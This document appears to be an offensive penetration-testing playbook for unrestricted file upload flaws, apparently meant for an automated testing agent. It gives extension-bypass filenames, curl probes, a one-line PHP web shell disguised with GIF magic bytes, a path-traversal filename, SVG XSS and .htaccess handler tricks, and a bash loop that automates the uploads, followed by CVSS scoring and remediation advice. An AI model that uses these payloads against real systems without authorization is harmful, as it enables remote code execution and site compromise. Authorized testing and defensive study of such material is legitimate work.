# Offensive Playbook: Unrestricted File Upload & Web-Shell Escalation

## 1. Overview & Attack Surface
Unrestricted file upload occurs when an application lets users store files without validating type, content, extension, or execution context — enabling stored XSS, config overwrite, or remote code execution via a dropped web shell.

## 2. Classification & Detection
### A. Extension blacklist bypass
Upload `shell.php`, then variants: `shell.phtml`, `shell.phar`, `shell.php5`, `shell.PHP`,
`shell.php.jpg`, `shell.php%00.jpg`, double extension `shell.jpg.php`.
Probe: `curl -s -F "file=@shell.phtml" <target>/upload | grep -oiE '(upload|success|path|href)[^<]*'`.

### B. Content-Type / magic-byte spoofing
Send `Content-Type: image/jpeg` with PHP body, or prepend `GIF89a` magic bytes:
`printf 'GIF89a<?php system($_GET["c"]);?>' > shell.gif` and upload as image.
Verify server honors extension over content (or vice versa).

### C. Path / location control
Try `filename=../../shell.php` traversal, or check whether the upload lands in a
web-executable directory (`/uploads/`, `/static/`, `/media/`). Fetch the returned
path/URL and confirm the file is directly retrievable.

### D. Secondary impact
SVG upload → stored XSS (`<svg onload=...>`). CSV → formula injection.
`.htaccess` / `web.config` upload → handler remap to executable.

## 3. Sandbox Automated Validation
```bash
for ext in php phtml phar php5 PHP php.jpg; do
  echo "== $ext"; curl -s -F "file=@payload.$ext" <target>/upload | head -c 300; echo;
done
curl -s -o /dev/null -w "%{http_code}" <target>/uploads/shell.phtml
```

## 4. Verification & Reporting
1. Confirm the uploaded file is reachable AND (executed code | rendered active content).
   A bare "upload success" message without retrievability is Probable, not Confirmed.
2. File finding via `create_vulnerability_report`:
   - **Category**: File Upload / Code Execution (OWASP A04:2021, A08:2021)
   - **CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
   - **CVSS 3.1**: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base 8.8 High; 9.9 Critical if unauthenticated)
   - **Remediation**: Allowlist extensions + content sniffing, randomize stored names,
     serve uploads from a non-executable domain/path with `Content-Disposition: attachment`.
